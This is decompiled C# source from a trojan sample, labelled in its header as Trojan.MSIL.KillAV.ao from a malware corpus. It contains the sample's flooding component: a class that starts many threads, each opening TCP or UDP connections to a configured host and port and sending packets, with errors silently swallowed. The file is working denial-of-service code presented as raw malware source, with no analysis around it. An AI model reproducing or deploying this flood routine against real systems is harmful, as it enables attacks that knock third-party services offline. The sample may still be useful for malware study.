// Decompiled with JetBrains decompiler
// Type: n.FLD
// Assembly: yes, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83EB8C5F-168C-47FA-93FE-E25AA6C64B02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.KillAV.ao-937fd99ab6df975f8ace26b4ce6ead21ae41a82f170fbe18646720cacc517e69.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net.Sockets;
using System.Threading;

namespace n
{
  public class FLD
  {
    public byte[] pk;
    public string HOST;
    public int Port;
    public int Count;
    private int ALV;

    public FLD()
    {
      this.pk = new byte[1];
      this.ALV = 0;
    }

    public void Start(ref bool TCP)
    {
      try
      {
        Thread[] threadArray = new Thread[checked (this.Count + 1)];
        int num1;
        do
        {
          Thread.Sleep(1);
          int num2 = checked (threadArray.Length - 1);
          int index = 0;
          while (index <= num2)
          {
            if (threadArray[index] == null & this.ALV < 100)
            {
              threadArray[index] = !TCP ? new Thread(new ThreadStart(this.UDP), 1024) : new Thread(new ThreadStart(this.TCP), 1024);
              threadArray[index].Start();
            }
            else
              checked { ++num1; }
            checked { ++index; }
          }
        }
        while (num1 != threadArray.Length);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void UDP()
    {
      byte[] numArray = new byte[0];
      byte[] pk = this.pk;
      try
      {
        UdpClient udpClient = new UdpClient();
        udpClient.Client.Connect(this.HOST, this.Port);
        udpClient.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        goto label_6;
      }
      UdpClient udpClient1 = new UdpClient();
      try
      {
        udpClient1.Connect(this.HOST, this.Port);
        udpClient1.Client.SendTimeout = -1;
        udpClient1.Client.ReceiveTimeout = -1;
        udpClient1.Client.Send(pk, pk.Length, SocketFlags.None);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_6:
      checked { this.ALV += -1; }
    }

    public void TCP()
    {
      byte[] numArray = new byte[0];
      byte[] pk = this.pk;
      try
      {
        TcpClient tcpClient = new TcpClient();
        tcpClient.Client.Connect(this.HOST, this.Port);
        tcpClient.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        goto label_6;
      }
      TcpClient tcpClient1 = new TcpClient();
      try
      {
        tcpClient1.Connect(this.HOST, this.Port);
        tcpClient1.Client.SendTimeout = -1;
        tcpClient1.Client.ReceiveTimeout = -1;
        tcpClient1.Client.Send(pk, pk.Length, SocketFlags.None);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_6:
      checked { this.ALV += -1; }
    }
  }
}
